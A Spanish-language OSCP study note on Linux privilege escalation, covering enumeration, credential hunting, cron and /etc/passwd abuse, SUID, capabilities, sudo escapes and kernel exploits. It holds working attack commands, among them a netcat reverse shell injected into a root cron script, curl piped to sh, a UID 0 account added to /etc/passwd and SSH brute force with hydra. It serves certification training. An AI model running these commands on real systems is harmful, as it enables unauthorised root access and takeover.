---
tipo: modulo
modulo: 18
estado: repasado
tags:
  - oscp
  - privesc
  - linux
fecha: 2026-10-08
---

# 18 - Linux Privilege Escalation

> [!abstract] Resumen
> Equivalente Linux del módulo 17: tras el foothold como user sin privilegios, enumerar a fondo y buscar vías a **root**.
> - **18.1 Enumerar Linux**: permisos de ficheros (`rwx` + owner/group/others), **SUID/SGID**, enumeración manual (user actual, `/etc/passwd`, hostname, kernel/SO, procesos, red, firewall, cron, paquetes instalados, ficheros world-writable, discos, módulos del kernel) y automatizada (`unix-privesc-check`, LinEnum, **LinPEAS**).
> - **18.2 Información confidencial expuesta**: rastros del user (dotfiles, variables de entorno, historiales) y huellas de servicios/daemons (procesos con credenciales en claro, sniffing con `tcpdump`).
> - **18.3 Permisos de fichero inseguros**: abusar de **cron jobs** editables y de `/etc/passwd` escribible.
> - **18.4 Componentes del sistema inseguros**: binarios **SUID** y **capabilities** mal configurados (GTFOBins), **sudo** mal configurado (GTFOBins + bypass de restricciones con AppArmor/audit), y exploits de **kernel**.
> Idea clave del examen: en Linux casi todo gira en torno a **permisos** (de ficheros, de sudo, de capabilities) más que en servicios como en Windows — `find`/`ls -la`/`getcap`/`sudo -l` son las herramientas base, y **GTFOBins** es la referencia constante para convertir un binario permitido en shell de root.

## Conceptos clave
- **Permisos Linux**: cada fichero tiene `rwx` para **owner**, **owner group** y **others**. `ls -l` lo muestra como `-rw-r-----` (tipo + 3×3 bits). Hay que mirar siempre a quién pertenece (user:group) y qué puede hacer cada categoría.
- **SUID/SGID**: bits especiales en el campo de ejecución (`s` en vez de `x`) que hacen que un binario se ejecute con el **UID/GID efectivo del propietario**, no del que lo lanza. Root los usa para dar acceso puntual y controlado a recursos privilegiados (ej. `passwd` escribe en `/etc/shadow` aunque lo ejecute cualquier user). Un SUID root mal elegido = privesc directo.
- **UID real vs efectivo**: visibles en `/proc/<pid>/status` (`Uid: real effective saved filesystem`). Un proceso con SUID muestra UID real del user pero UID efectivo distinto (root).
- **Enumeración manual (checklist)**: `id`/`/etc/passwd` (users), `hostname`, `/etc/issue` + `/etc/*-release` + `uname -a` (SO/kernel), `ps aux` (procesos), `ip a`/`routel`/`ss -anp` (red), `iptables`/ficheros en `/etc/iptables` (firewall), `/etc/cron.*` + `crontab -l` (tareas programadas), `dpkg -l`/`rpm -qa` (paquetes), `find / -writable` (ficheros/carpetas escribibles), `mount`/`/etc/fstab`/`lsblk` (discos), `lsmod`/`modinfo` (módulos de kernel), `find / -perm -u=s` (binarios SUID).
- **Enumeración automatizada**: `unix-privesc-check` (script simple, modos standard/detailed), **LinEnum**, **LinPEAS** (el más completo, análogo a winPEAS). Nunca sustituyen la revisión manual — cada entorno tiene configuraciones propias que un script genérico puede pasar por alto.
- **Dotfiles y rastros del user**: ficheros como `.bashrc` (se ejecuta en cada shell nueva) pueden contener credenciales exportadas como variables de entorno (`env`). El historial de comandos y archivos de configuración personal son objetivos rápidos de revisar.
- **Huellas de servicios**: procesos lanzados por root pueden pasar credenciales en claro por línea de comandos, visibles con `ps aux`/`watch`. Capturar tráfico local con `tcpdump` (si el user tiene permiso vía sudo) puede revelar credenciales que circulan por la loopback.
- **Cron jobs como vector de privesc**: si un script ejecutado por cron (como root) es editable por el user actual, insertar un payload en él da ejecución como el propietario del cron job en el próximo disparo. Revisar `/var/log/syslog` (`grep CRON`) para ver qué se ejecuta y con qué frecuencia.
- **`/etc/passwd` escribible**: si el user tiene escritura sobre `/etc/passwd` (fallo de configuración poco común pero posible, ej. en integraciones híbridas con AD/LDAP mal hechas), se puede añadir una línea con UID/GID `0` y un hash de password generado con `openssl passwd` → nuevo "root" a medida.
- **GTFOBins**: catálogo online de binarios Unix legítimos que, en ciertas condiciones (SUID, sudo, capability), pueden usarse para escapar a una shell privilegiada, leer/escribir ficheros o escalar. Referencia obligada al encontrar un binario con SUID, capability, o permiso de sudo inusual.
- **Linux capabilities**: permisos granulares a nivel de kernel (ej. `cap_net_raw`, `cap_setuid`) que se pueden asignar a un binario sin darle SUID completo. Se enumeran con `getcap -r / 2>/dev/null`; `+ep` = effective+permitted. Un binario con `cap_setuid+ep` (ej. `perl`) puede usarse para obtener un UID arbitrario.
- **`sudo -l`**: lista qué comandos puede ejecutar el user actual con sudo. Si alguno de esos comandos aparece en GTFOBins como explotable vía sudo, se puede escalar — aunque el camino "obvio" puede estar bloqueado por **AppArmor** (MAC a nivel de kernel, perfiles por binario) o quedar registrado por **auditd**; conviene revisar `aa-status` y `/var/log/syslog` si algo falla inesperadamente, y probar el siguiente comando permitido.
- **Exploits de kernel**: igual que en Windows, hay que identificar versión exacta de kernel/SO (`uname -r`, `/etc/issue`), buscar con `searchsploit`, compilar con `gcc` (normalmente en el propio target o cross en Kali si no hay compilador) y ejecutar. Priorizar el candidato más reciente que aún aplique a la versión objetivo.

> [!tip] Idea para el examen
> Orden de ataque recomendado: **enumeración manual rápida** (user/grupos, SO/kernel, procesos, cron, SUID) → revisar dotfiles/env/historiales → **LinPEAS** como contraste → si hay binario con SUID/capability raro, mirar **GTFOBins** → `sudo -l` y GTFOBins otra vez → cron jobs editables → `/etc/passwd` escribible (poco común pero rápido de comprobar: `ls -la /etc/passwd`) → si nada cuaja, exploit de kernel acorde a versión exacta. Capability `cap_setuid+ep` en `perl`/`python`/similar es un clásico de examen.

---

## 18.1 Enumerar Linux

### Permisos y SUID/SGID
```bash
ls -l /etc/shadow                       # ejemplo: -rw-r----- 1 root shadow
find / -perm -u=s -type f 2>/dev/null    # binarios con bit SUID
find / -perm -g=s -type f 2>/dev/null    # binarios con bit SGID
```
| Flag / parte | Qué hace |
|---|---|
| `-perm -u=s` | busca ficheros con el bit SUID activado (ejecuta como el owner, normalmente root) |
| `2>/dev/null` | descarta errores de permiso denegado para no ensuciar el output |

### Enumeración manual
```bash
id                                    # UID/GID/grupos del user actual
cat /etc/passwd                        # lista de users (login:x:UID:GID:comentario:home:shell)
hostname                                # nombre del host (pistas sobre su rol)
cat /etc/issue ; cat /etc/os-release ; uname -a     # SO, versión, kernel, arquitectura
ps aux                                   # procesos en ejecución (incluye los de root)
ip a ; routel ; ss -anp                   # interfaces, rutas, conexiones/puertos activos
cat /etc/iptables/rules.v4                  # reglas de firewall persistidas (si son legibles)
ls -lah /etc/cron* ; crontab -l ; sudo crontab -l    # cron jobs del sistema y del user
dpkg -l   # o: rpm -qa                        # paquetes instalados (Debian/RedHat)
find / -writable -type d 2>/dev/null          # carpetas escribibles por el user actual
cat /etc/fstab ; mount ; lsblk                 # discos y puntos de montaje
lsmod ; modinfo <modulo>                        # módulos de kernel cargados y su info
```
| Flag / parte | Qué hace |
|---|---|
| `id` | muestra UID, GID y grupos secundarios del user actual |
| `sudo crontab -l` | lista los cron jobs del user root, si el user actual tiene permiso de sudo para ello |
| `find / -writable -type d` | localiza carpetas donde el user actual puede escribir — útil para hijacking de scripts |

### Enumeración automatizada
```bash
unix-privesc-check standard > output.txt     # chequeo rápido de configuraciones inseguras
```
```bash
# LinPEAS (análogo a winPEAS)
python3 -m http.server 80            # en Kali, sirviendo el binario
curl http://<IP_kali>/linpeas.sh | sh    # o wget + ejecución local en el target
```
> [!tip] `unix-privesc-check`/LinEnum/LinPEAS dan un buen punto de partida, pero cada entorno tiene configuraciones propias (scripts custom, cron jobs ad-hoc) que solo la revisión manual detecta con fiabilidad.

---

## 18.2 Información confidencial expuesta

### Rastros del usuario (dotfiles, env, historiales)
```bash
env                              # variables de entorno (buscar credenciales exportadas)
cat ~/.bashrc                      # dotfile ejecutado en cada shell nueva; revisar exports
su - <user>                          # probar password encontrada directamente
```
Si se obtiene una contraseña parcial o un patrón, generar diccionario dirigido y probar por fuerza bruta remota:
```bash
crunch 6 6 -t Lab%%% > wordlist         # diccionario con patrón fijo + sufijo numérico
hydra -l <user> -P wordlist <IP> -t 4 ssh -V    # fuerza bruta SSH con el diccionario
ssh <user>@<IP>                           # login con la credencial encontrada
sudo -l                                     # comprobar permisos de sudo del nuevo user
sudo -i                                      # elevar si sudo permite ALL
```

### Huellas de servicios/daemons
```bash
watch -n 1 "ps -aux | grep pass"          # vigilar procesos en busca de credenciales en línea de comandos
sudo tcpdump -i lo -A | grep "pass"         # sniffing de tráfico local (requiere permiso de sudo sobre tcpdump)
```
> [!warning] `tcpdump` necesita privilegios para abrir raw sockets; solo funciona si el user tiene sudo específicamente sobre ese binario (`sudo -l`).

---

## 18.3 Permisos de fichero inseguros

### Abusar de cron jobs
Ver nota → [[Cron Jobs Privesc (Linux)]].
```bash
grep "CRON" /var/log/syslog                     # ver qué cron jobs se ejecutan y como quién
cat /ruta/al/script.sh ; ls -lah /ruta/al/script.sh    # contenido y permisos del script que lanza cron
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_kali> <puerto> >/tmp/f' >> /ruta/al/script.sh
```
```bash
nc -lnvp <puerto>                # listener en Kali, esperar al próximo disparo del cron
```

### Abusar de `/etc/passwd` escribible
Ver nota → [[Editar etc-passwd para Privesc]].
```bash
ls -la /etc/passwd                          # comprobar si es world-writable
openssl passwd <password_elegida>             # genera hash compatible con /etc/passwd
echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2                                        # login como el nuevo "root"
```

---

## 18.4 Abusar de componentes inseguros del sistema

### SUID binaries y capabilities
Ver nota → [[SUID y Capabilities (Linux)]].
```bash
ps u -C <binario>                               # ver como quién corre un proceso (ej. passwd como root)
grep Uid /proc/<PID>/status                       # UID real/efectivo/guardado/filesystem del proceso
find / -perm -u=s -type f 2>/dev/null              # binarios SUID (buscar en GTFOBins el hallazgo)
find /home/<user> -exec "/usr/bin/bash" -p \;         # ejemplo clásico: abusar de find con SUID
/usr/sbin/getcap -r / 2>/dev/null                    # binarios con capabilities asignadas
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'   # abuso de cap_setuid+ep en perl (ver GTFOBins)
```

### Abusar de sudo
Ver nota → [[Abusing Sudo (GTFOBins)]].
```bash
sudo -l                                     # comandos permitidos por sudo para el user actual
aa-status                                    # perfiles de AppArmor activos (puede bloquear el "obvio" de GTFOBins)
cat /var/log/syslog | grep <binario>           # confirmar si AppArmor/audit bloqueó el intento
sudo apt-get changelog apt                      # ejemplo de GTFOBins para apt-get con sudo
!/bin/sh                                          # dentro del pager (less) lanzado por apt-get, escapa a shell
```

### Exploits de kernel
```bash
cat /etc/issue ; uname -r ; arch                     # versión exacta de SO, kernel, arquitectura
searchsploit "linux kernel <distro> <version> Local Privilege Escalation"
cp /usr/share/exploitdb/exploits/linux/local/<exploit>.c .
gcc <exploit>.c -o <exploit>                           # compilar (idealmente en el target o con su misma libc)
scp <exploit>.c <user>@<IP>:                             # transferir si se compila en destino
./<exploit>                                                # ejecutar
```

> [!warning] Errores comunes / cosas que fallan
> - Encontrar un binario SUID o con capability no implica que sea explotable: siempre comprobar en **GTFOBins** la forma correcta de abusarlo.
> - Un comando permitido por `sudo -l` puede estar bloqueado por **AppArmor**, aunque GTFOBins lo liste como viable — revisar `aa-status` y `/var/log/syslog` antes de descartar el vector, y probar el siguiente comando de la lista.
> - Compilar un exploit de kernel en Kali y transferirlo puede fallar por diferencias de libc/arquitectura; si es posible, compilar directamente en el target.
> - `/etc/passwd` escribible es un hallazgo raro; comprobarlo rápido (`ls -la`) pero no asumir que estará presente.
> - No fiarse ciegamente de LinPEAS/LinEnum: revisar siempre manualmente cron, SUID y sudo.

## Ejemplo práctico
> [!example] Cadena en debian-privesc
> 1. SSH como `joe` → `env` revela `SCRIPT_CREDENTIALS=lab` exportada en `.bashrc`.
> 2. Probar la password directamente con `su - root` → funciona (root directo).
> 3. Alternativa: usar el patrón de password para generar diccionario (`crunch`) y fuerza bruta SSH (`hydra`) contra el user `eve`, descubierto en `/etc/passwd` → login → `sudo -l` muestra `(ALL:ALL) ALL` → `sudo -i` → root.
> 4. Con `joe`: `sudo crontab -l` revela un script en `~/.scripts/user_backups.sh` ejecutado por cron como root y editable por `joe` → insertar reverse shell → `nc -lnvp` → shell de root.
> 5. `sudo -l` de `joe` permite `tcpdump` y `apt-get`; `tcpdump` está bloqueado por AppArmor, pero `apt-get changelog apt` (GTFOBins) escapa a shell de root vía `less`.
> 6. En otra máquina Ubuntu 16.04 (kernel 4.4.0-116), `searchsploit` encuentra un exploit de kernel aplicable; compilarlo con `gcc`, transferirlo con `scp` y ejecutarlo da `uid=0(root)` directo.
> 7. Capability `cap_setuid+ep` en `perl` (hallada con `getcap -r /`) → one-liner de GTFOBins con `POSIX::setuid(0)` → shell de root.

## Relacionado
- Técnicas: [[SUID y Capabilities (Linux)]] · [[Cron Jobs Privesc (Linux)]] · [[Abusing Sudo (GTFOBins)]] · [[Editar etc-passwd para Privesc]] · [[LinPEAS]]
- Cheatsheet: [[Privesc Linux]]
- Módulo previo: [[17 - Windows Privilege Escalation]]
- Relacionado: [[SearchSploit]] (búsqueda de exploits de kernel), [[Hydra]] (fuerza bruta de credenciales filtradas)
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Repasar más ejemplos de GTFOBins por categoría (SUID / sudo / capabilities) para no depender de buscar cada vez en caliente.
> - Profundizar en cómo identificar perfiles AppArmor activos y si se pueden enumerar sin ser root (para saber de antemano qué vectores de sudo estarán bloqueados).
> - Repasar diferencias prácticas entre compilar un exploit de kernel en el target vs en Kali y transferir el binario (compatibilidad de libc).
